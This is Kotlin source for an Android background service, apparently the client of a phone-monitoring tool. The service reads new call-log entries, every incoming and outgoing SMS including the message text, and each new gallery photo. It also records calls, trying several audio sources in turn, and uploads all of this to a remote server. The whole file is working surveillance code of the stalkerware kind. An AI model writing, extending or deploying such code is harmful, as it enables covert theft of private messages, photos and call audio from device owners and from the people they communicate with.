package com.example.bullsseeclient.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.database.Cursor
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.HandlerThread
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import android.Manifest
import com.example.bullsseeclient.api.ApiClient
import com.example.bullsseeclient.api.CallDto
import com.example.bullsseeclient.api.SmsDto
import com.example.bullsseeclient.api.ImageDto
import java.time.Instant
import android.provider.MediaStore
import android.util.Base64
import android.content.ContentUris
import java.io.InputStream
import android.telephony.TelephonyManager
import android.telephony.PhoneStateListener
import android.os.Looper
import android.media.MediaRecorder
import android.media.AudioManager
import java.io.File
import okhttp3.MultipartBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

class SmsCallMonitorService : Service() {
    private var observerThread: HandlerThread? = null
    private var callLogObserver: ContentObserver? = null
    private var lastSentId: Long = -1L
    private var smsObserver: ContentObserver? = null
    private var lastSmsInboxId: Long = -1L
    private var lastSmsSentId: Long = -1L
    private var imageObserver: ContentObserver? = null
    private var lastImageId: Long = -1L
    private var telephonyManager: TelephonyManager? = null
    private var phoneStateListener: PhoneStateListener? = null
    private var recorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var callActive: Boolean = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        android.util.Log.d("SmsCallMonitorService", "onCreate")
        startForeground()
        observerThread = HandlerThread("CallLogObserver").also { it.start() }
        val handler = Handler(observerThread!!.looper)

        val hasReadCallLog = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
        val hasReadSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        val hasReceiveSms = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
        val hasReadMediaImages = if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        val hasReadPhoneState = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
        val hasRecordAudio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

        if (hasReadCallLog) {
            callLogObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) { onChange(selfChange, null) }
                override fun onChange(selfChange: Boolean, uri: Uri?) { processLatestCall() }
            }
            contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver!!)
        } else {
            android.util.Log.e("SmsCallMonitorService", "READ_CALL_LOG missing; call log observer disabled")
        }

        if (hasReadSms || hasReceiveSms) {
            smsObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) { onChange(selfChange, null) }
                override fun onChange(selfChange: Boolean, uri: Uri?) { processLatestSms() }
            }
            contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver!!)
        } else {
            android.util.Log.e("SmsCallMonitorService", "SMS permissions missing; sms observer disabled")
        }

        if (hasReadMediaImages) {
            imageObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) { onChange(selfChange, null) }
                override fun onChange(selfChange: Boolean, uri: Uri?) { processLatestImage() }
            }
            contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, imageObserver!!)
        } else {
            android.util.Log.e("SmsCallMonitorService", "image read permission missing; image observer disabled")
        }

        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (!hasReadPhoneState) {
            android.util.Log.e("SmsCallMonitorService", "READ_PHONE_STATE missing; call state listener not registered")
        } else {
            phoneStateListener = object : PhoneStateListener() {
                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    android.util.Log.d("SmsCallMonitorService", "onCallStateChanged state=${state} number=${phoneNumber}")
                    when (state) {
                        TelephonyManager.CALL_STATE_OFFHOOK -> {
                            if (!callActive) {
                                callActive = true
                                android.util.Log.d("SmsCallMonitorService", "CALL_STATE_OFFHOOK -> startRecording")
                            if (hasRecordAudio) startRecording() else android.util.Log.e("SmsCallMonitorService", "RECORD_AUDIO missing; recording skipped")
                            }
                        }
                        TelephonyManager.CALL_STATE_IDLE -> {
                            if (callActive) {
                                callActive = false
                                android.util.Log.d("SmsCallMonitorService", "CALL_STATE_IDLE -> stopRecordingAndUpload")
                                Handler(Looper.getMainLooper()).postDelayed({ stopRecordingAndUpload() }, 800)
                            }
                        }
                    }
                }
            }
            telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("SmsCallMonitorService", "onStartCommand")
        return START_STICKY
    }

    private fun startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("CALL_MONITOR", "Call Monitor", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification: Notification = NotificationCompat.Builder(this, "CALL_MONITOR")
            .setContentTitle("Call Monitor")
            .setContentText("Monitoring calls and recording")
            .setSmallIcon(android.R.drawable.stat_sys_phone_call)
            .build()
        startForeground(1001, notification)
    }

    private fun startRecording() {
        recordingFile = File.createTempFile("call_rec_", ".m4a", cacheDir)
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.mode = AudioManager.MODE_IN_COMMUNICATION
        } catch (_: Exception) {}
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            if (tryStartRecording(MediaRecorder.AudioSource.VOICE_CALL)) {
                android.util.Log.d("SmsCallMonitorService", "Recording with VOICE_CALL")
                return
            }
            if (tryStartRecording(MediaRecorder.AudioSource.VOICE_COMMUNICATION)) {
                android.util.Log.d("SmsCallMonitorService", "Recording with VOICE_COMMUNICATION")
                return
            }
        }
        if (tryStartRecording(MediaRecorder.AudioSource.VOICE_RECOGNITION)) {
            android.util.Log.d("SmsCallMonitorService", "Recording with VOICE_RECOGNITION")
            return
        }
        if (tryStartRecording(MediaRecorder.AudioSource.MIC)) {
            android.util.Log.d("SmsCallMonitorService", "Recording with MIC")
            return
        }
        android.util.Log.e("SmsCallMonitorService", "All audio sources failed; recording disabled")
        recordingFile?.delete()
        recordingFile = null
    }

    private fun tryStartRecording(audioSource: Int): Boolean {
        return try {
            recorder?.release()
            recorder = MediaRecorder()
            recorder?.apply {
                setAudioSource(audioSource)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128_000)
                setAudioSamplingRate(44_100)
                setOutputFile(recordingFile?.absolutePath)
                prepare()
                start()
            }
            true
        } catch (e: Exception) {
            android.util.Log.e("SmsCallMonitorService", "startRecording(${audioSource}) error: ${e.message}")
            false
        }
    }

    private fun stopRecordingAndUpload() {
        var file: File? = recordingFile
        try {
            recorder?.apply {
                try { stop() } catch (_: Exception) {}
                reset()
                release()
            }
        } catch (_: Exception) {}
        recorder = null
        recordingFile = null

        if (file != null && file.exists()) {
            try {
                val meta = getLatestCallMeta()
                val bytes = file.readBytes()
                file.delete()
                if (bytes.isEmpty()) {
                    android.util.Log.e("SmsCallMonitorService", "recording empty; skipping upload")
                    return
                }
                val media = "audio/mp4".toMediaType()
                val part = MultipartBody.Part.createFormData(
                    "file",
                    "call_rec_${System.currentTimeMillis()}.m4a",
                    bytes.toRequestBody(media)
                )
                val numberPart = (meta?.number ?: "").toRequestBody("text/plain".toMediaType())
                val typePart = (meta?.type ?: "").toRequestBody("text/plain".toMediaType())
                val datePart = (meta?.date ?: "").toRequestBody("text/plain".toMediaType())
                val durationPart = ((meta?.duration ?: 0).toString()).toRequestBody("text/plain".toMediaType())
                sendCallRecordingFile(part, numberPart, typePart, datePart, durationPart)
            } catch (e: Exception) {
                android.util.Log.e("SmsCallMonitorService", "Upload recording error: ${e.message}")
            }
        }
    }

    private fun sendCallEventFromLog(dto: CallDto) {
        android.util.Log.d("SmsCallMonitorService", "sendCallEventFromLog number=${dto.number} date=${dto.date} type=${dto.type} duration=${dto.duration}")
        ApiClient.api.sendCallLogs(listOf(dto)).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {
                android.util.Log.d("SmsCallMonitorService", "upload status=${response.code()}")
            }
            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {
                android.util.Log.e("SmsCallMonitorService", "upload error=${t.message}")
            }
        })
    }

    private fun processLatestCall() {
        val uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE, CallLog.Calls.DURATION)
        val sortOrder = CallLog.Calls.DATE + " DESC"
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, sortOrder)
            if (cursor != null && cursor.moveToFirst()) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls._ID))
                val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
                val durationVal = if (durationIdx != -1) cursor.getInt(durationIdx) else null
                if (id != lastSentId) {
                    lastSentId = id
                    val typeStr = when (typeInt) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
                        CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                        CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "ANSWERED_EXTERNALLY"
                        else -> "UNKNOWN"
                    }
                    val dateIso = Instant.ofEpochMilli(date).toString()
                    sendCallEventFromLog(CallDto(number = number, date = dateIso, type = typeStr, duration = durationVal))
                }
            }
        } catch (e: SecurityException) {
            android.util.Log.e("SmsCallMonitorService", "READ_CALL_LOG not granted: ${e.message}")
        } catch (e: Exception) {
            android.util.Log.e("SmsCallMonitorService", "CallLog observer query error: ${e.message}")
        } finally {
            cursor?.close()
        }
    }

    private fun getLatestCallMeta(): CallDto? {
        val uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE, CallLog.Calls.DURATION)
        val sortOrder = CallLog.Calls.DATE + " DESC"
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, sortOrder)
            if (cursor != null && cursor.moveToFirst()) {
                val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
                val durationVal = if (durationIdx != -1) cursor.getInt(durationIdx) else null
                val typeStr = when (typeInt) {
                    CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                    CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                    CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
                    CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                    CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "ANSWERED_EXTERNALLY"
                    else -> "UNKNOWN"
                }
                val dateIso = Instant.ofEpochMilli(date).toString()
                return CallDto(number = number, date = dateIso, type = typeStr, duration = durationVal)
            }
        } catch (_: Exception) {
        } finally {
            cursor?.close()
        }
        return null
    }

    private fun sendSmsEvent(dto: SmsDto) {
        ApiClient.api.sendSmsLogs(listOf(dto)).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
        })
    }

    private fun processLatestSms() {
        processLatestSmsFrom(Uri.parse("content://sms/inbox"), isSent = false)
        processLatestSmsFrom(Uri.parse("content://sms/sent"), isSent = true)
    }

    private fun processLatestSmsFrom(uri: Uri, isSent: Boolean) {
        val projection = arrayOf("_id", "address", "body", "date")
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, "date DESC")
            if (cursor != null && cursor.moveToFirst()) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow("_id"))
                val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                val date = cursor.getLong(cursor.getColumnIndexOrThrow("date"))
                if (isSent) {
                    if (id != lastSmsSentId) {
                        lastSmsSentId = id
                        sendSmsEvent(SmsDto(address = address, body = body, type = "OUTGOING", date = Instant.ofEpochMilli(date).toString()))
                    }
                } else {
                    if (id != lastSmsInboxId) {
                        lastSmsInboxId = id
                        sendSmsEvent(SmsDto(address = address, body = body, type = "INCOMING", date = Instant.ofEpochMilli(date).toString()))
                    }
                }
            }
        } catch (e: SecurityException) {
        } catch (e: Exception) {
        } finally {
            cursor?.close()
        }
    }

    private fun sendImageEvent(dto: ImageDto) {
        ApiClient.api.sendCameraImages(listOf(dto)).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
        })
    }

    private fun sendCallRecordingFile(
        filePart: MultipartBody.Part,
        number: okhttp3.RequestBody,
        type: okhttp3.RequestBody,
        date: okhttp3.RequestBody,
        duration: okhttp3.RequestBody
    ) {
        ApiClient.api.sendCallRecording(filePart, number, type, date, duration).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
        })
    }

    private fun processLatestImage() {
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED)
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
            )
            if (cursor != null && cursor.moveToFirst()) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val dateAddedSec = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                if (id != lastImageId) {
                    lastImageId = id
                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    val input: InputStream? = contentResolver.openInputStream(contentUri)
                    if (input != null) {
                        val bytes = input.readBytes()
                        input.close()
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        val ts = Instant.ofEpochSecond(dateAddedSec).toString()
                        sendImageEvent(ImageDto(base64Image = b64, timestamp = ts))
                    }
                }
            }
        } catch (e: SecurityException) {
        } catch (e: Exception) {
        } finally {
            cursor?.close()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (callLogObserver != null) contentResolver.unregisterContentObserver(callLogObserver!!)
        if (smsObserver != null) contentResolver.unregisterContentObserver(smsObserver!!)
        if (imageObserver != null) contentResolver.unregisterContentObserver(imageObserver!!)
        observerThread?.quitSafely()
        telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
    }

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, SmsCallMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
            else context.startService(intent)
        }
    }
}
